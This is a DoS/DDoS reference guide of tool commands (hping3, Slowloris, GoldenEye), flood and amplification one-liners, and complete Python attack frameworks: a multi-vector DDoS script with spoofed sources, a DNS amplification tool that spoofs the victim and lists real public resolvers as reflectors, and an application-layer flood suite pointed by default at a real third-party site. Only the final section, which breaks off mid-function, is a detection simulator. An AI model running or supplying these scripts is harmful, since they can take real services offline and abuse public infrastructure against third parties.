# Denial of Service (DoS) and Distributed Denial of Service (DDoS) - Topics Overview

## Topic Explanation
Denial of Service (DoS) and Distributed Denial of Service (DDoS) attacks are designed to make computer systems, networks, or services unavailable to legitimate users by overwhelming them with malicious traffic or exploiting vulnerabilities to crash systems. DoS attacks originate from a single source, while DDoS attacks utilize multiple compromised systems (botnets) to amplify the attack power. These attacks can target various layers of the network stack including network infrastructure, application layer, and system resources. Understanding DoS/DDoS attack vectors, mitigation strategies, and detection techniques is crucial for maintaining service availability and business continuity.

## Articles for Further Reference
- [NIST Special Publication 800-61: Computer Security Incident Handling Guide](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final)
- [RFC 4732: Internet Denial-of-Service Considerations](https://tools.ietf.org/html/rfc4732)
- [SANS Institute: DDoS Attacks and Defense](https://www.sans.org/white-papers/37563/)
- [Cloudflare DDoS Attack Trends](https://blog.cloudflare.com/ddos-attack-trends-for-2023-q4/)
- [Akamai State of the Internet Security Report](https://www.akamai.com/resources/state-of-the-internet-reports)

## Reference Links
- [DDoS Attack Map - Digital Attack Map](https://www.digitalattackmap.com/)
- [Cloudflare DDoS Protection](https://www.cloudflare.com/ddos/)
- [AWS Shield DDoS Protection](https://aws.amazon.com/shield/)
- [MITRE ATT&CK - Impact Techniques](https://attack.mitre.org/tactics/TA0040/)
- [US-CERT DDoS Quick Guide](https://www.cisa.gov/uscert/ncas/tips/ST04-015)
- [Arbor Networks ATLAS Intelligence](https://www.netscout.com/atlas)

## Available Tools for the Topic

### Tool Name: LOIC (Low Orbit Ion Cannon)
**Description:** Open-source network stress testing and denial-of-service attack application written in C#, commonly used for testing network defenses.

**Example Usage:**
```bash
# Download and run LOIC
# GUI Application - No command line usage
# Set target IP/URL
# Select attack method (TCP, UDP, HTTP)
# Configure attack parameters
# Start attack
```

**Reference Links:**
- [LOIC GitHub Repository](https://github.com/NewEraCracker/LOIC)

### Tool Name: HOIC (High Orbit Ion Cannon)
**Description:** Updated version of LOIC designed to attack up to 256 URLs simultaneously with the ability to use "boosters" to enhance attack effectiveness.

**Example Usage:**
```bash
# Run HOIC application
# Add target URLs
# Configure attack settings
# Load booster scripts for enhanced attacks
# Launch coordinated attack
```

**Reference Links:**
- [HOIC Information](https://sourceforge.net/projects/high-orbit-ion-cannon/)

### Tool Name: hping3
**Description:** Command-line oriented TCP/IP packet assembler/analyzer that can be used for network security auditing, firewall testing, and DoS testing.

**Example Usage:**
```bash
# TCP SYN flood attack
hping3 -S --flood -V -p 80 target-ip

# UDP flood attack
hping3 --udp --flood -V -p 53 target-ip

# ICMP flood attack
hping3 --icmp --flood -V target-ip

# Smurf attack simulation
hping3 --icmp --spoof broadcast-ip target-ip

# TCP SYN attack with random source
hping3 -S --flood --rand-source -p 80 target-ip
```

**Reference Links:**
- [hping3 Official Site](http://www.hping.org/)
- [hping3 Manual](http://manpages.ubuntu.com/manpages/trusty/man8/hping3.8.html)

### Tool Name: Slowloris
**Description:** Application layer DoS attack tool that opens connections to a target web server and keeps them open by sending partial HTTP requests.

**Example Usage:**
```python
# Basic Slowloris attack
python slowloris.py target-website.com

# Slowloris with custom parameters
python slowloris.py target-website.com -p 80 -s 1000 -ua

# Slowloris with proxy support
python slowloris.py target-website.com --proxy-host proxy.example.com --proxy-port 8080
```

**Reference Links:**
- [Slowloris GitHub](https://github.com/gkbrk/slowloris)

### Tool Name: GoldenEye
**Description:** Python-based HTTP DoS test tool that can utilize both Slowloris and HTTP keep-alive connection exhaustion attacks.

**Example Usage:**
```bash
# Basic GoldenEye attack
python goldeneye.py http://target-website.com

# GoldenEye with custom parameters
python goldeneye.py http://target-website.com -w 100 -s 1000

# GoldenEye with method and user-agent randomization
python goldeneye.py http://target-website.com -m random -d
```

**Reference Links:**
- [GoldenEye GitHub](https://github.com/jseidl/GoldenEye)

### Tool Name: Scapy
**Description:** Powerful Python library for packet manipulation that can be used to craft custom DoS attacks and test network resilience.

**Example Usage:**
```python
from scapy.all import *

# SYN flood attack
def syn_flood(target_ip, target_port):
    ip_layer = IP(dst=target_ip)
    tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
    packet = ip_layer / tcp_layer
    send(packet, loop=1, verbose=0)

# UDP flood attack
def udp_flood(target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(RandString(size=1024))
    send(packet, loop=1, verbose=0)

# ICMP flood attack
def icmp_flood(target_ip):
    packet = IP(dst=target_ip) / ICMP() / Raw(RandString(size=1024))
    send(packet, loop=1, verbose=0)
```

**Reference Links:**
- [Scapy Documentation](https://scapy.readthedocs.io/)

## All Possible Payloads for Manual Approach

### TCP-based DoS Attacks
```bash
# SYN Flood using hping3
hping3 -S --flood --rand-source -p 80 target-ip

# TCP Connection exhaustion
for i in {1..1000}; do (telnet target-ip 80 &); done

# TCP RST flood
hping3 -R --flood --rand-source -p 80 target-ip

# TCP FIN flood
hping3 -F --flood --rand-source -p 80 target-ip

# Sockstress attack (low-rate TCP attack)
hping3 -S -p 80 --tcp-timestamp --win 0 --interval u1000 target-ip
```

### UDP-based DoS Attacks
```bash
# UDP flood with hping3
hping3 --udp --flood --rand-source -p 53 target-ip

# UDP packet bomb
hping3 --udp --flood -d 65507 target-ip

# DNS amplification preparation
dig @open-resolver.com ANY target-domain.com

# NTP amplification
ntpdc -c monlist ntp-server.com

# SNMP amplification
snmpwalk -v2c -c public amplifier-ip
```

### ICMP-based DoS Attacks
```bash
# ICMP flood (Ping flood)
ping -f -s 65507 target-ip

# ICMP flood with hping3
hping3 --icmp --flood target-ip

# Smurf attack (ICMP broadcast amplification)
hping3 --icmp --spoof target-ip broadcast-address

# Ping of death (historical)
ping -s 65507 target-ip
```

### Application Layer DoS Attacks
```python
# Slowloris attack implementation
import socket
import threading
import time

def slowloris_attack(target_host, target_port, num_connections):
    def create_connection():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_host, target_port))
            sock.send(b"GET /?%d HTTP/1.1\r\n" % time.time())
            sock.send(b"User-Agent: Mozilla/5.0\r\n")
            sock.send(b"Accept-language: en-US,en,q=0.5\r\n")
            return sock
        except:
            return None
    
    sockets = []
    for _ in range(num_connections):
        sock = create_connection()
        if sock:
            sockets.append(sock)
    
    while True:
        for sock in sockets[:]:
            try:
                sock.send(b"X-a: %d\r\n" % time.time())
            except:
                sockets.remove(sock)
                new_sock = create_connection()
                if new_sock:
                    sockets.append(new_sock)
        time.sleep(15)

# HTTP POST DoS (R.U.D.Y - R U Dead Yet)
def rudy_attack(target_url, field_name="data"):
    import requests
    session = requests.Session()
    
    while True:
        try:
            response = session.post(target_url, 
                                  data={field_name: "A" * 1000000},
                                  stream=True, timeout=1)
        except:
            time.sleep(1)
```

### Amplification Attack Vectors
```bash
# DNS amplification attack
dig @8.8.8.8 ANY target-domain.com
dig @1.1.1.1 TXT target-domain.com

# NTP amplification
ntpdc -c monlist ntp-server.example.com

# Memcached amplification
echo -e "stats\r\n" | nc memcached-server.com 11211

# SSDP amplification
echo -e "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nST: upnp:rootdevice\r\nMX: 3\r\n\r\n" | nc -u ssdp-amplifier.com 1900

# CharGEN amplification
echo "test" | nc chargen-server.com 19
```

## Example Payloads

### 1. Multi-Vector DDoS Attack Simulation
```python
#!/usr/bin/env python3
import threading
import socket
import random
import time
from scapy.all import *

class MultiVectorDDoS:
    def __init__(self, target_ip, target_ports=[80, 443, 22, 21]):
        self.target_ip = target_ip
        self.target_ports = target_ports
        self.running = False
        self.threads = []
    
    def syn_flood_attack(self, port):
        """SYN flood attack on specific port"""
        while self.running:
            try:
                # Create random source IP and port
                src_ip = ".".join([str(random.randint(1, 254)) for _ in range(4)])
                src_port = random.randint(1024, 65535)
                
                # Create SYN packet
                packet = IP(src=src_ip, dst=self.target_ip) / \
                        TCP(sport=src_port, dport=port, flags="S", seq=random.randint(1000, 9000))
                
                send(packet, verbose=0)
                time.sleep(0.001)  # Small delay to avoid overwhelming local network
            except:
                pass
    
    def udp_flood_attack(self, port):
        """UDP flood attack on specific port"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running:
            try:
                # Create random payload
                payload = random._urandom(1024)
                sock.sendto(payload, (self.target_ip, port))
            except:
                pass
    
    def icmp_flood_attack(self):
        """ICMP flood attack"""
        while self.running:
            try:
                # Create random source IP
                src_ip = ".".join([str(random.randint(1, 254)) for _ in range(4)])
                
                # Create ICMP packet with large payload
                packet = IP(src=src_ip, dst=self.target_ip) / \
                        ICMP(type=8) / \
                        Raw(load="A" * 1000)
                
                send(packet, verbose=0)
                time.sleep(0.001)
            except:
                pass
    
    def http_flood_attack(self, port=80):
        """HTTP GET flood attack"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_ip, port))
                
                # Send HTTP GET request
                request = f"GET /{random.randint(1000, 9999)} HTTP/1.1\r\n"
                request += f"Host: {self.target_ip}\r\n"
                request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                request += "Connection: keep-alive\r\n\r\n"
                
                sock.send(request.encode())
                sock.close()
            except:
                pass
    
    def slowloris_attack(self, port=80):
        """Slowloris attack implementation"""
        sockets = []
        
        # Create initial connections
        for _ in range(100):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_ip, port))
                
                # Send partial HTTP request
                sock.send(b"GET /?%d HTTP/1.1\r\n" % random.randint(1000, 9999))
                sock.send(b"User-Agent: Mozilla/5.0\r\n")
                sock.send(b"Accept-language: en-US,en,q=0.5\r\n")
                
                sockets.append(sock)
            except:
                pass
        
        # Keep connections alive
        while self.running:
            for sock in sockets[:]:
                try:
                    sock.send(b"X-a: %d\r\n" % random.randint(1000, 9999))
                except:
                    sockets.remove(sock)
                    
                    # Create new connection to replace dead one
                    try:
                        new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_sock.settimeout(1)
                        new_sock.connect((self.target_ip, port))
                        new_sock.send(b"GET /?%d HTTP/1.1\r\n" % random.randint(1000, 9999))
                        sockets.append(new_sock)
                    except:
                        pass
            
            time.sleep(10)
    
    def start_attack(self, duration=60):
        """Start multi-vector DDoS attack"""
        print(f"Starting multi-vector DDoS attack against {self.target_ip}")
        print(f"Attack duration: {duration} seconds")
        
        self.running = True
        
        # Start SYN flood threads
        for port in self.target_ports:
            thread = threading.Thread(target=self.syn_flood_attack, args=(port,))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        # Start UDP flood threads
        for port in [53, 123, 1900]:  # DNS, NTP, SSDP
            thread = threading.Thread(target=self.udp_flood_attack, args=(port,))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        # Start ICMP flood
        thread = threading.Thread(target=self.icmp_flood_attack)
        thread.daemon = True
        thread.start()
        self.threads.append(thread)
        
        # Start HTTP flood
        if 80 in self.target_ports:
            thread = threading.Thread(target=self.http_flood_attack, args=(80,))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        # Start Slowloris attack
        if 80 in self.target_ports:
            thread = threading.Thread(target=self.slowloris_attack, args=(80,))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        # Run attack for specified duration
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop_attack()
    
    def stop_attack(self):
        """Stop all attack threads"""
        print("Stopping DDoS attack...")
        self.running = False
        
        # Wait for threads to finish
        for thread in self.threads:
            thread.join(timeout=1)
        
        print("Attack stopped")

# Example usage
if __name__ == "__main__":
    # WARNING: Only use against systems you own or have permission to test
    target = "192.168.1.100"  # Replace with test target
    
    ddos = MultiVectorDDoS(target)
    ddos.start_attack(duration=30)  # 30-second test
```

### 2. DNS Amplification Attack Framework
```python
#!/usr/bin/env python3
import socket
import threading
import random
import time
from scapy.all import *

class DNSAmplificationAttack:
    def __init__(self, target_ip, amplifiers_file="dns_amplifiers.txt"):
        self.target_ip = target_ip
        self.amplifiers = []
        self.load_amplifiers(amplifiers_file)
        self.running = False
    
    def load_amplifiers(self, filename):
        """Load DNS amplifier servers from file"""
        try:
            with open(filename, 'r') as f:
                self.amplifiers = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            # Default open resolvers (for testing only)
            self.amplifiers = [
                "8.8.8.8",
                "1.1.1.1", 
                "208.67.222.222",
                "64.6.64.6"
            ]
        
        print(f"Loaded {len(self.amplifiers)} DNS amplifiers")
    
    def create_dns_query(self, domain="example.com", query_type="ANY"):
        """Create DNS query packet"""
        # Create spoofed DNS query
        dns_query = IP(src=self.target_ip, dst=random.choice(self.amplifiers)) / \
                   UDP(sport=random.randint(1024, 65535), dport=53) / \
                   DNS(id=random.randint(1, 65535), 
                       qr=0,  # Query
                       opcode=0,  # Standard query
                       rd=1,  # Recursion desired
                       qd=DNSQR(qname=domain, qtype=query_type))
        
        return dns_query
    
    def amplification_worker(self):
        """Worker thread for sending amplified DNS queries"""
        # Domains that typically have large DNS responses
        large_response_domains = [
            "test.example.com",
            "dnssec.example.com", 
            "large.example.com"
        ]
        
        query_types = ["ANY", "TXT", "MX", "AAAA"]
        
        while self.running:
            try:
                domain = random.choice(large_response_domains)
                query_type = random.choice(query_types)
                
                # Create and send spoofed DNS query
                packet = self.create_dns_query(domain, query_type)
                send(packet, verbose=0)
                
                # Small delay to avoid overwhelming amplifiers
                time.sleep(0.01)
                
            except Exception as e:
                print(f"Error in amplification worker: {e}")
                time.sleep(1)
    
    def calculate_amplification_factor(self, domain="example.com"):
        """Calculate potential amplification factor"""
        try:
            # Send query and measure response size
            query = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(qd=DNSQR(qname=domain, qtype="ANY"))
            response = sr1(query, timeout=2, verbose=0)
            
            if response:
                query_size = len(query)
                response_size = len(response)
                amplification_factor = response_size / query_size
                
                print(f"Domain: {domain}")
                print(f"Query size: {query_size} bytes")
                print(f"Response size: {response_size} bytes") 
                print(f"Amplification factor: {amplification_factor:.2f}x")
                
                return amplification_factor
            
        except Exception as e:
            print(f"Error calculating amplification factor: {e}")
        
        return 1.0
    
    def start_attack(self, duration=60, num_threads=10):
        """Start DNS amplification attack"""
        print(f"Starting DNS amplification attack against {self.target_ip}")
        print(f"Using {len(self.amplifiers)} amplifiers")
        print(f"Attack duration: {duration} seconds")
        print(f"Number of threads: {num_threads}")
        
        # Calculate amplification factors for common domains
        print("\nTesting amplification factors:")
        test_domains = ["example.com", "google.com", "cloudflare.com"]
        for domain in test_domains:
            self.calculate_amplification_factor(domain)
        
        self.running = True
        threads = []
        
        # Start worker threads
        for _ in range(num_threads):
            thread = threading.Thread(target=self.amplification_worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            pass
        finally:
            print("\nStopping DNS amplification attack...")
            self.running = False
            
            # Wait for threads to finish
            for thread in threads:
                thread.join(timeout=1)
        
        print("Attack stopped")

# Example usage
if __name__ == "__main__":
    # Create DNS amplifiers file
    amplifiers = [
        "8.8.8.8",
        "1.1.1.1",
        "208.67.222.222", 
        "64.6.64.6",
        "77.88.8.8",
        "156.154.70.1"
    ]
    
    with open("dns_amplifiers.txt", "w") as f:
        for amp in amplifiers:
            f.write(f"{amp}\n")
    
    # Start attack (use only on systems you own)
    attack = DNSAmplificationAttack("192.168.1.100")
    attack.start_attack(duration=30, num_threads=5)
```

### 3. Application Layer DoS Testing Suite
```python
#!/usr/bin/env python3
import requests
import threading
import time
import random
import string
import socket
import ssl

class ApplicationLayerDoS:
    def __init__(self, target_url):
        self.target_url = target_url
        self.running = False
        self.session = requests.Session()
        
        # Configure session for DoS testing
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def http_get_flood(self):
        """HTTP GET flood with random parameters"""
        while self.running:
            try:
                # Add random parameters to avoid caching
                params = {
                    'param1': ''.join(random.choices(string.ascii_letters, k=10)),
                    'param2': random.randint(1, 1000000),
                    'timestamp': time.time()
                }
                
                response = self.session.get(self.target_url, params=params, timeout=5)
                print(f"GET request sent, status: {response.status_code}")
                
            except Exception as e:
                print(f"GET flood error: {e}")
                time.sleep(1)
    
    def http_post_flood(self):
        """HTTP POST flood with large payloads"""
        while self.running:
            try:
                # Create large POST data
                data = {
                    'field1': 'A' * 10000,
                    'field2': 'B' * 10000,
                    'field3': ''.join(random.choices(string.ascii_letters, k=5000))
                }
                
                response = self.session.post(self.target_url, data=data, timeout=5)
                print(f"POST request sent, status: {response.status_code}")
                
            except Exception as e:
                print(f"POST flood error: {e}")
                time.sleep(1)
    
    def slowloris_attack(self):
        """Slowloris attack - partial HTTP requests"""
        sockets = []
        target_host = self.target_url.split('/')[2]
        target_port = 443 if 'https' in self.target_url else 80
        
        # Create initial connections
        for _ in range(200):
            try:
                if 'https' in self.target_url:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock = ssl.wrap_socket(sock)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                sock.settimeout(5)
                sock.connect((target_host, target_port))
                
                # Send partial HTTP request
                request = f"GET /?{random.randint(1000, 9999)} HTTP/1.1\r\n"
                request += f"Host: {target_host}\r\n"
                request += "User-Agent: Mozilla/5.0\r\n"
                request += "Accept-language: en-US,en,q=0.5\r\n"
                
                sock.send(request.encode())
                sockets.append(sock)
                
            except Exception as e:
                print(f"Slowloris connection error: {e}")
        
        print(f"Created {len(sockets)} Slowloris connections")
        
        # Keep connections alive
        while self.running:
            for sock in sockets[:]:
                try:
                    # Send keep-alive headers
                    header = f"X-a: {random.randint(1, 5000)}\r\n"
                    sock.send(header.encode())
                    
                except Exception:
                    sockets.remove(sock)
                    
                    # Replace dead connection
                    try:
                        if 'https' in self.target_url:
                            new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_sock = ssl.wrap_socket(new_sock)
                        else:
                            new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        
                        new_sock.settimeout(5)
                        new_sock.connect((target_host, target_port))
                        
                        request = f"GET /?{random.randint(1000, 9999)} HTTP/1.1\r\n"
                        request += f"Host: {target_host}\r\n"
                        new_sock.send(request.encode())
                        
                        sockets.append(new_sock)
                        
                    except:
                        pass
            
            print(f"Active Slowloris connections: {len(sockets)}")
            time.sleep(15)
    
    def rudy_attack(self):
        """R.U.D.Y (R U Dead Yet) - Slow POST attack"""
        while self.running:
            try:
                target_host = self.target_url.split('/')[2]
                target_port = 443 if 'https' in self.target_url else 80
                
                if 'https' in self.target_url:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock = ssl.wrap_socket(sock)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                sock.connect((target_host, target_port))
                
                # Send HTTP POST headers
                content_length = 1000000  # Large content length
                post_header = f"POST / HTTP/1.1\r\n"
                post_header += f"Host: {target_host}\r\n"
                post_header += f"Content-Length: {content_length}\r\n"
                post_header += "Content-Type: application/x-www-form-urlencoded\r\n"
                post_header += "\r\n"
                
                sock.send(post_header.encode())
                
                # Send POST data very slowly
                for i in range(content_length):
                    sock.send(b"A")
                    time.sleep(0.1)  # Very slow transmission
                    
                    if not self.running:
                        break
                
                sock.close()
                
            except Exception as e:
                print(f"R.U.D.Y attack error: {e}")
                time.sleep(1)
    
    def xml_bomb_attack(self):
        """XML bomb DoS attack"""
        xml_bomb = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>'''
        
        while self.running:
            try:
                headers = {'Content-Type': 'application/xml'}
                response = self.session.post(self.target_url, 
                                           data=xml_bomb, 
                                           headers=headers, 
                                           timeout=5)
                print(f"XML bomb sent, status: {response.status_code}")
                
            except Exception as e:
                print(f"XML bomb error: {e}")
                time.sleep(1)
    
    def start_attack(self, attack_types=['get_flood'], duration=60):
        """Start application layer DoS attacks"""
        print(f"Starting application layer DoS attack against {self.target_url}")
        print(f"Attack types: {attack_types}")
        print(f"Duration: {duration} seconds")
        
        self.running = True
        threads = []
        
        attack_methods = {
            'get_flood': self.http_get_flood,
            'post_flood': self.http_post_flood,
            'slowloris': self.slowloris_attack,
            'rudy': self.rudy_attack,
            'xml_bomb': self.xml_bomb_attack
        }
        
        # Start attack threads
        for attack_type in attack_types:
            if attack_type in attack_methods:
                for _ in range(5 if attack_type != 'slowloris' else 1):  # Fewer threads for Slowloris
                    thread = threading.Thread(target=attack_methods[attack_type])
                    thread.daemon = True
                    thread.start()
                    threads.append(thread)
        
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            pass
        finally:
            print("\nStopping application layer DoS attack...")
            self.running = False
            
            # Wait for threads to finish
            for thread in threads:
                thread.join(timeout=1)
        
        print("Attack stopped")

# Example usage
if __name__ == "__main__":
    # Test different attack types
    target = "http://httpbin.org/post"  # Safe testing target
    
    app_dos = ApplicationLayerDoS(target)
    
    # Test individual attacks
    print("Testing HTTP GET flood...")
    app_dos.start_attack(['get_flood'], duration=10)
    
    time.sleep(2)
    
    print("Testing HTTP POST flood...")
    app_dos.start_attack(['post_flood'], duration=10)
    
    time.sleep(2)
    
    print("Testing combined attacks...")
    app_dos.start_attack(['get_flood', 'post_flood'], duration=15)
```

### 4. DDoS Detection and Mitigation Simulator
```python
#!/usr/bin/env python3
import threading
import time
import random
from collections import defaultdict, deque
import matplotlib.pyplot as plt
import numpy as np

class DDoSDetectionSystem:
    def __init__(self, threshold_pps=1000, time_window=60):
        self.threshold_pps = threshold_pps  # Packets per second threshold
        self.time_window = time_window  # Time window in seconds
        self.packet_counts = defaultdict(lambda: deque())
        self.blocked_ips = set()
        self.alert_count = 0
        self.monitoring = False
        
        # Statistics
        self.total_packets = 0
        self.legitimate_packets = 0
        self.attack_packets = 0
        self.blocked_packets = 0
        
        # Time series data for visualization
        self.time_series = {
            'timestamps': [],
            'packet_rates': [],
            'attack_detected': []
        }
    
    def simulate_legitimate_traffic(self):
        """Simulate normal network traffic"""
        while self.monitoring:
            # Normal traffic pattern (50-200 pps with some variance)
            base_rate = 100
            variance = random.randint(-50, 50)
            packets_per_second = max(1, base_rate + variance)
            
            for _ in range(packets_per_second):
                if not self.monitoring:
                    break
                    
                # Generate legitimate source IP
                src_ip = f"192.168.1.{random.randint(1, 100)}"
                self.process_packet(src_ip, is_attack=False)
                
                time.sleep(1.0 / packets_per_second)
            
            # Small random delay
            time.sleep(random.uniform(0.5, 2.0))
    
    def simulate_ddos_attack(self, attack_duration=30, attack_intensity=5000):
        """Simulate DDoS attack traffic"""
        print(f"Starting DDoS attack simulation (intensity: {attack_intensity} pps)")
        start_time = time.time()
        
        while time.time() - start_time < attack_duration and self.monitoring:
            # Generate attack traffic from random IPs
            for _ in range(attack_intensity):
                if not self.monitoring:
                    break
                    
                # Generate random attacker IP
                src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                self.process_packet(src_ip, is_attack=True)
            
            time.sleep(1.0)
    
    def process_packet(self, src_ip, is_attack=False):
        """Process incoming packet and update statistics"""
        current_time = time.time()
        
        # Skip if IP is already blocked
        if src_ip in self.blocked_ips:
            self.blocked_packets += 1
            return
        
        # Update packet counts
        self.packet_counts[src_ip].append(current_time)
        self.total_packets += 1
        
        if is_attack:
            self.attack_packets += 1
        else:
            self.legitimate_packets += 1
        
        # Clean old entries
        self.cleanup_old_entries(src_ip, current_time)
        
        # Check for rate limiting
        if self.is_rate_exceeded(src_ip, current_time):
            self.block_ip(src_ip)
    
    def cleanup_old_entries(self, src_ip, current_time):
        """Remove packet entries older than time window"""
        cutoff_time = current_time - self.time_window
        
        while (self.packet_counts[src_ip] and 
               self.packet_counts[src_ip][0] < cutoff_time):
            self.packet_counts[src_ip].popleft()
    
    def is_rate_exceeded(self, src_ip, current_time):
        """Check if packet rate exceeds threshold"""
        packet_count = len(self.packet_counts[src_ip])
        time_span = current_time - self.packet_counts[src_ip][0] if packet_count > 0 else 1
        
        if time_span > 0:
            packets_per_second = packet_count / min(time_span, self.time_window)
            return packets_per_second > self.threshold_pps
        
        return False
    
    def block_ip(self, src_ip):
        """Block IP address"""
        if src_ip not in self.blocked_ips:
            self.blocked_ips.add(src_ip)
            self.alert_count += 1
            print(f"ALERT: Blocked IP {src_ip} - Rate limit exceeded")
    
    def calculate_current_pps(self):
        """Calculate current packets per second across all IPs"""
        current_time = time.time()
        total_recent_packets = 0
        
        for ip, packets in self.packet_counts.items():
            # Count packets in last second
            recent_packets = sum(1 for timestamp in packets 
                               if current_time - timestamp <= 1.0)
            total_recent_packets += recent_packets
        
        return total_recent_packets
    
    def detect_attack_pattern(self):
        """Advanced attack pattern detection"""
        current_pps = self.calculate_current_pps()
        current_time = time.time()
        
        # Record metrics for visualization
        self.time_series['timestamps'].append(current_time)
        self.time_series['packet_rates'].append(current_pps)
        
        # Simple threshold-based detection
        attack_detected = current_pps > self.threshold_pps * 2
        self.time_series['attack_detected'].append(attack_detected)
        
        if attack_detected:
            print(f"DDoS ATTACK DETECTED: {current_pps} pps (threshold: {self.threshold_pps})")
            
            # Implement mitigation strategies
            self.implement_mitigation()
    
    def implement_mitigation(self):
        """Implement DDoS mitigation strategies"""
        # Rate limiting: Block top talkers
        ip_rates = {}
        current_time = time.time()
        
        for ip, packets in self.packet_counts.items():
            if ip not in self.blocked_ips:
                recent_packets = len([p for p in packets if current_time - p <= 5.0])
                if recent_packets > 0:
                    ip_rates[ip] = recent_packets
        
        # Block top 10 highest rate IPs
        top_talkers = sorted(ip_rates.items(), key=lambda x: x[1], reverse=True)[:10]
        
        for ip, rate in top_talkers:
            if rate > self.threshold_pps / 10:  # Block if rate is 10% of threshold
                self.block_ip(ip)
    
    def monitoring_loop(self):
        """Main monitoring loop"""
        while self.monitoring:
            self.detect_attack_pattern()
            time.sleep(1)
    
    def start_monitoring(self, duration=120):
        """Start DDoS monitoring and simulation"""
        print(f"Starting DDoS detection system (threshold: {self.threshold_pps} pps)")
        self.monitoring = True
        
        # Start monitoring thread
        monitor_thread = threading.Thread(target=self.monitoring_loop)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Start legitimate traffic simulation
        legit_thread = threading.Thread(target=self.simulate_legitimate_traffic)
        legit_thread.daemon = True
        legit_thread.start()
        
        # Schedule attack after 30 seconds
        def delayed_attack():
            time.sleep(30)
            attack_thread = threading.Thread(target=self.simulate_ddos_attack, 
                                           args=(40, 3000))
            attack_thread.daemon = True
            attack_thread.start()
        
        attack_schedule = threading.Thread(target=delayed_attack)
        attack_schedule.daemon = True
        attack_schedule.start()
        
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            pass
        finally:
            self.monitoring = False
            print("\nStopping monitoring...")
    
    def generate_report(self):
        """Generate detection system report"""
        print("\n" + "="*50)
        print("DDOS DETECTION SYSTEM REPORT")
        print("="*50)
        print(f"Total packets processed: {self.total_packets}")
        print(f"Legitimate packets: {self.legitimate_packets}")
        print(f"Attack packets: {self.attack_packets}")
        print(f"Blocked packets: {self.blocked_packets}")
        print(f"IPs blocked: {len(self.blocked_ips)}")
        print(f"Alerts generated: {self.alert_count}")
        
        if self.total_packets > 0:
            detection_rate = (self.blocked_packets / self.attack_packets) * 100 if self.attack_packets > 0 else 0
            false_positive_rate = (self.blocked_packets - (self.blocked_packets * detection_rate / 100)) / self.legitimate_packets * 100 if self.legitimate_packets > 0 else 0
            
            print(f"Detection rate: {detection_rate:.2f}%")
            print(f"False positive rate: {false_positive_rate:.2f}%")
        
        print(f"Blocked IPs: {list(self.blocked_ips)[:10]}...")  # Show first 10
    
    def visualize_traffic(self):
        """Create traffic visualization"""
        if not self.time_series['timestamps']:
            print("No data to visualize")
            return
        
        # Convert timestamps to relative time
        start_time = self.time_series['timestamps'][0]
        relative_times = [(t - start_time) for t in self.time_series['timestamps']]
        
        # Create plot
        fig, (ax1, ax2) = plt.subplots(2, 1, figsize=(12, 8))
        
        # Plot packet rate
        ax1.plot(relative_times, self.time_series['packet_rates'], 'b-', linewidth=1)
        ax1.axhline(y=self.threshold_pps, color='r', linestyle='--', label='Threshold')
        ax1.set_ylabel('Packets per Second')
        ax1.set_title('Network Traffic Rate')
        ax1.legend()
        ax1.grid(True)
        
        # Plot attack detection
        attack_indicators = [1 if x else 0 for x in self.time_series['attack_detected']]
        ax2.fill_between(relative_times, attack_indicators, alpha=0.3, color='red', label='Attack Detected')
        ax2.set_ylabel('Attack Detected')
        ax2.set_xlabel('Time (seconds)')
        ax2.set_title('Attack Detection Timeline')
        ax2.legend()
        ax2.grid(True)
        
        plt.tight_layout()
